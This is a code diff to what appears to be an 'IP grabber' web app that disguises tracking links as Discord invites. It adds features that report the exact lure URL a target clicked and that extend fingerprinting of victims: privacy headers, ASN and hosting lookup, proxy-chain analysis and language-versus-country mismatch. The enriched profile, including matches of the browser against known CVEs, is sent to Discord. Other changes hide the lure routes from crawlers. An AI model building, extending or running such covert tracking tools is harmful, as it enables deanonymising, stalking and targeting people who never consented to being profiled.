@@ -35,6 +35,43 @@ redirected: bool
 config: dict
 sub_nets: list
 
+# Paths that must NOT trigger the shield. Crawlers/static-asset probes that
+# hit the catch-all invite route are noise — respond benignly instead of
+# treating the filename as a Discord invite / victim.
+BLOCKED_CRAWLER_PATHS = frozenset({
+    "robots.txt", "sitemap.xml", "sitemap-index.xml", "siteindex.xml",
+    "ads.txt", "humans.txt", "security.txt", "well-known/security.txt",
+    "bingbot.json", "bingsiteauth.xml", "bing-site-authentication.xml",
+    "google.html", "google-site-verification.html",
+    "manifest.json", "browserconfig.xml", "apple-app-site-association",
+    "assetlinks.json", "favicon.ico", "favicon.png", "favicon.svg",
+    "service-worker.js", "sw.js",
+})
+
+BLOCKED_CRAWLER_PREFIXES = (".well-known/",)
+
+BLOCKED_CRAWLER_SUFFIXES = (
+    ".css", ".js", ".mjs", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
+    ".ico", ".webp", ".avif", ".xml", ".txt", ".json", ".webmanifest",
+    ".woff", ".woff2", ".ttf", ".eot", ".otf", ".pdf", ".zip", ".gz",
+)
+
+
+def is_blocked_crawler_path(path):
+    """Return True for crawler/static-asset paths that must not trigger the shield."""
+    if not path:
+        return False
+    norm = path.strip().lstrip("/").lower()
+    if not norm:
+        return False
+    if norm in BLOCKED_CRAWLER_PATHS:
+        return True
+    if any(norm.startswith(p) for p in BLOCKED_CRAWLER_PREFIXES):
+        return True
+    if any(norm.endswith(s) for s in BLOCKED_CRAWLER_SUFFIXES):
+        return True
+    return False
+
 
 def read_subnets_from_file(filename_or_url):
     global sub_nets
@@ -249,6 +286,7 @@ def extract_device_info(request_obj):
         "x_forwarded_port": headers.get("X-Forwarded-Port", "Unknown"),
         # Browser fingerprinting headers
         "dnt": headers.get("DNT", "Unknown"),  # Do Not Track
+        "sec_gpc": headers.get("Sec-GPC", "Unknown"),  # Global Privacy Control
         "pragma": headers.get("Pragma", "Unknown"),
         "if_modified_since": headers.get("If-Modified-Since", "Unknown"),
         "if_none_match": headers.get("If-None-Match", "Unknown"),
@@ -386,6 +424,19 @@ def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
     embed["fields"].append(
         {"name": "🍯 HONEYPOT DETAILS", "value": honeypot_value, "inline": False}
     )
+
+    # Request route — the exact lure URL the target clicked
+    if device_info:
+        route_value = (
+            f"**Lure URL:** `{device_info['scheme']}://{device_info['host']}{device_info['path']}`\n"
+        )
+        if device_info.get("query_string"):
+            route_value += f"**Query:** `{device_info['query_string'][:60]}`\n"
+        route_value += f"**Method:** `{device_info['method']}`\n"
+        route_value += f"**Referer:** `{str(device_info['referer'])[:120]}`"
+        embed["fields"].append(
+            {"name": "🧭 REQUEST ROUTE", "value": route_value, "inline": False}
+        )
 
     if device_info:
         # Enhanced Device Profile
@@ -531,6 +582,18 @@ def create_ip_grabber_embed(
 
     embed["fields"].append(
         {"name": "👤 TARGET PROFILE", "value": target_value, "inline": False}
+    )
+
+    # Request route — the exact lure URL the target clicked
+    route_value = (
+        f"**Lure URL:** `{device_info['scheme']}://{device_info['host']}{device_info['path']}`\n"
+    )
+    if device_info.get("query_string"):
+        route_value += f"**Query:** `{device_info['query_string'][:60]}`\n"
+    route_value += f"**Method:** `{device_info['method']}`\n"
+    route_value += f"**Referer:** `{str(device_info['referer'])[:120]}`"
+    embed["fields"].append(
+        {"name": "🧭 REQUEST ROUTE", "value": route_value, "inline": False}
     )
 
     # Geographic Intelligence
@@ -927,6 +990,38 @@ async def collect_advanced_data():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 
+def build_request_profile(device_info):
+    """Build a compact request-route profile for the embed (URL/path/referer)."""
+    if not device_info:
+        return {}
+
+    def _ok(value):
+        return value not in (None, "", "Unknown", "None")
+
+    scheme = device_info.get("scheme") if _ok(device_info.get("scheme")) else ""
+    host = device_info.get("host") if _ok(device_info.get("host")) else ""
+    path = device_info.get("path") if _ok(device_info.get("path")) else ""
+    query = device_info.get("query_string") or ""
+    referer = device_info.get("referer") if _ok(device_info.get("referer")) else None
+
+    full_url = f"{scheme}://{host}{path}" if (scheme and host and path) else None
+    if full_url and query:
+        full_url += f"?{query}"
+
+    profile = {
+        "method": device_info.get("method") if _ok(device_info.get("method")) else None,
+        "scheme": scheme or None,
+        "host": host or None,
+        "path": path or None,
+        "query": query or None,
+        "fullUrl": full_url,
+        "referer": referer,
+        "contentType": device_info.get("content_type") if _ok(device_info.get("content_type")) else None,
+        "accessTime": device_info.get("access_time") if _ok(device_info.get("access_time")) else None,
+    }
+    return {k: v for k, v in profile.items() if v not in (None, "", False, 0)}
+
+
 def build_transport_profile(device_info):
     """Aggregate transport-layer hints from request headers into a single dict."""
     if not device_info:
@@ -1003,6 +1098,152 @@ def lookup_browser_cves(device_info, advanced_data=None):
     return summarise(lookup_cves(family, version))
 
 
+def build_protocol_posture(device_info):
+    """Derive connection posture from request headers.
+
+    Note: The app runs behind nginx proxy manager which terminates TLS and
+    downgrades to HTTP/1.1 for the upstream. The app cannot see the client's
+    actual TLS version or HTTP/2-3 version. Cloudflare free tier does not
+    expose JA3/JA4 fingerprints. This vector computes connection posture
+    (what IS obtainable), not TLS fingerprinting.
+    """
+    if not device_info:
+        return {}
+
+    def _present(value):
+        return value not in (None, "", "Unknown", "None")
+
+    xff = device_info.get("x_forwarded_for") if _present(device_info.get("x_forwarded_for")) else None
+    cf_ray = device_info.get("cf_ray") if _present(device_info.get("cf_ray")) else None
+    scheme = device_info.get("scheme") if _present(device_info.get("scheme")) else None
+    forwarded_proto = device_info.get("x_forwarded_proto") if _present(device_info.get("x_forwarded_proto")) else None
+
+    cf_visitor = device_info.get("cf_visitor")
+    cf_scheme = None
+    if _present(cf_visitor):
+        try:
+            import json as _json
+            cf_scheme = _json.loads(cf_visitor).get("scheme")
+        except (ValueError, TypeError):
+            cf_scheme = None
+
+    # Proxy chain depth
+    proxy_chain_depth = 1
+    if xff:
+        proxy_chain_depth = xff.count(",") + 1
+
+    # Protocol consistency
+    schemes = [s for s in (scheme, forwarded_proto, cf_scheme) if s]
+    proto_consistency = len(set(schemes)) <= 1 if schemes else True
+
+    # IP source — which header yielded the real IP
+    ip_source = None
+    if _present(device_info.get("cf_connecting_ip")):
+        ip_source = "CF-Connecting-IP"
+    elif _present(device_info.get("x_real_ip")):
+        ip_source = "X-Real-IP"
+    else:
+        ip_source = "remote_addr"
+
+    # XFF consistency — first hop match real IP
+    xff_consistent = True
+    real_ip = device_info.get("real_ip")
+    if xff and real_ip and _present(real_ip):
+        first_hop = xff.split(",")[0].strip()
+        xff_consistent = first_hop == real_ip
+
+    profile = {
+        "proxyChainDepth": proxy_chain_depth,
+        "cloudflareEdge": bool(cf_ray),
+        "cfRay": cf_ray,
+        "protoConsistency": proto_consistency,
+        "schemeObserved": scheme or cf_scheme or forwarded_proto,
+        "ipSource": ip_source,
+        "xffConsistent": xff_consistent,
+    }
+    return {k: v for k, v in profile.items() if v not in (None, "", False, 0)} | {
+        "protoConsistency": proto_consistency,
+    }
+
+
+def build_language_profile(device_info, country_code=None):
+    """Parse Accept-Language header into a structured language profile."""
+    if not device_info:
+        return {}
+
+    raw = device_info.get("accept_language", "Unknown")
+    if not raw or raw in ("Unknown", "None", ""):
+        return {}
+
+    import math
+
+    # Parse: en-US,en;q=0.9,de;q=0.8
+    entries = []
+    parts = raw.split(",")
+    for part in parts:
+        part = part.strip()
+        if ";" in part:
+            tag, q_str = part.split(";", 1)
+            tag = tag.strip()
+            q = 1.0
+            if "q=" in q_str:
+                try:
+                    q = float(q_str.split("q=")[1].strip())
+                except ValueError:
+                    q = 1.0
+        else:
+            tag = part.strip()
+            q = 1.0
+        if tag:
+            entries.append({"tag": tag, "q": q})
+
+    if not entries:
+        return {}
+
+    entries.sort(key=lambda e: e["q"], reverse=True)
+    primary = entries[0]["tag"]
+
+    # Split subtags
+    subtags = primary.split("-")
+    primary_language = subtags[0].lower()
+    region = None
+    script = None
+    for sub in subtags[1:]:
+        if len(sub) == 2:
+            region = sub.upper()
+        elif len(sub) == 4:
+            script = sub
+
+    # Shannon entropy of q-values
+    q_values = [e["q"] for e in entries]
+    total_q = sum(q_values)
+    entropy_bits = 0.0
+    if total_q > 0:
+        for q in q_values:
+            p = q / total_q
+            if p > 0:
+                entropy_bits -= p * math.log2(p)
+
+    # Geo mismatch
+    geo_mismatch = False
+    if country_code and region:
+        # Normalize: country code is 2-letter ISO, region is 2-letter from Accept-Language
+        if country_code.upper() != region and len(country_code) == 2:
+            geo_mismatch = True
+
+    return {
+        "primary": primary,
+        "primaryLanguage": primary_language,
+        "region": region,
+        "script": script,
+        "languages": entries,
+        "count": len(entries),
+        "entropyBits": round(entropy_bits, 2),
+        "geoMismatch": geo_mismatch,
+        "geoCountryCode": country_code if country_code else None,
+    }
+
+
 def send_advanced_data_to_discord(
     collected_data, device_info=None, ip_address=None, user_identifier=None
 ):
@@ -1029,9 +1270,43 @@ def send_advanced_data_to_discord(
             transport = build_transport_profile(device_info)
             if transport:
                 data["_serverTransport"] = transport
+            request_profile = build_request_profile(device_info)
+            if request_profile:
+                data["_serverRequest"] = request_profile
             cve_summary = lookup_browser_cves(device_info, data)
             if cve_summary and cve_summary.get("count", 0) > 0:
                 data["_serverCveMatches"] = cve_summary
+            # Phase B: enrich privacy signals with server-side Sec-GPC header
+            sec_gpc = (device_info or {}).get("sec_gpc", "Unknown")
+            if sec_gpc not in ("Unknown", "None", "", None):
+                ps = data.get("privacySignals")
+                if isinstance(ps, dict) and not ps.get("error"):
+                    ps["secGpcHeader"] = sec_gpc
+                elif isinstance(ps, dict) and ps.get("error"):
+                    ps["secGpcHeader"] = sec_gpc
+                else:
+                    data["privacySignals"] = {"gpc": None, "dnt": None, "secGpcHeader": sec_gpc}
+            # Phase D: server-side ASN / hosting org lookup
+            try:
+                from asn_lookup import lookup_asn
+                asn_info = lookup_asn(ip_address or "")
+                if asn_info:
+                    data["_serverAsn"] = asn_info
+            except Exception as e:
+                l.error(f"ASN lookup failed: {e}")
+            # Phase D: protocol posture
+            protocol_posture = build_protocol_posture(device_info)
+            if protocol_posture:
+                data["_serverProtocol"] = protocol_posture
+            # Phase D: language profile (needs country code)
+            cc = None
+            if device_info:
+                cc = device_info.get("cf_ipcountry")
+                if not cc or cc in ("Unknown", "None", "XX"):
+                    cc = get_country(ip_address) if ip_address else None
+            lang_profile = build_language_profile(device_info, cc)
+            if lang_profile:
+                data["_serverLanguage"] = lang_profile
 
         # Perform device recognition if we have device info
         recognition_info = None
@@ -1330,6 +1605,9 @@ async def ip_grab(dc_handle):
 async def refer(dc_invite):
     l.info("Custom route called.")
     l.info(f"Route is: {dc_invite}")
+    if is_blocked_crawler_path(dc_invite):
+        l.info(f"Blocked crawler/static path, skipping shield: {dc_invite}")
+        return "", 404
     ip_address = request.headers.get("X-Real-IP")
     l.info(f"IP Address is: {ip_address}")
     custom_server = f"https://discord.gg/{dc_invite}"
@@ -1347,7 +1625,11 @@ async def refer_custom(dc_invite, honeypot):
     l.info("Custom route called with custom honeypot.")
     ip_address = request.headers.get("X-Real-IP")
     l.info(f"IP Address is: {ip_address}")
-    l.info(f"Route is: {dc_invite}/{honeypot}")
+    full_path = f"{dc_invite}/{honeypot}"
+    l.info(f"Route is: {full_path}")
+    if is_blocked_crawler_path(full_path) or is_blocked_crawler_path(honeypot):
+        l.info(f"Blocked crawler/static path, skipping shield: {full_path}")
+        return "", 404
     custom_server = f"https://discord.gg/{dc_invite}"
     custom_honeypot = f"https://discord.gg/{honeypot}"
     try:
@@ -1363,6 +1645,16 @@ async def refer_custom(dc_invite, honeypot):
 @app.route("/favicon.ico")
 async def favicon():
     return await send_file("favicon.ico")
+
+
+@app.route("/robots.txt")
+async def robots():
+    """Serve a real robots.txt so crawlers de-index the lure/honeypot routes.
+
+    Registered before the catch-all invite route so it wins over /<path:dc_invite>.
+    """
+    body = "User-agent: *\nDisallow: /\n"
+    return body, 200, {"Content-Type": "text/plain; charset=utf-8"}
 
 
 if __name__ == "__main__":
@@ -1394,6 +1686,17 @@ if __name__ == "__main__":
     except Exception as e:
         l.error(f"Failed to load GeoIP database: {e}")
         l.warning("Country detection may be delayed on first request")
+
+    # Preload ASN database at startup (mirrors GeoIP preload)
+    l.info("Preloading ASN database...")
+    try:
+        from asn_lookup import set_logger as set_asn_logger, _load_db as _load_asn_db
+        set_asn_logger(l)
+        _load_asn_db()
+        l.passing("ASN database loaded successfully")
+    except Exception as e:
+        l.error(f"Failed to load ASN database: {e}")
+        l.warning("ASN lookup may be delayed on first request")
 
     # Fetch VPN subnets from GitHub with fallback to local file
     vpn_source = "https://raw.githubusercontent.com/X4BNet/lists_vpn/main/ipv4.txt"
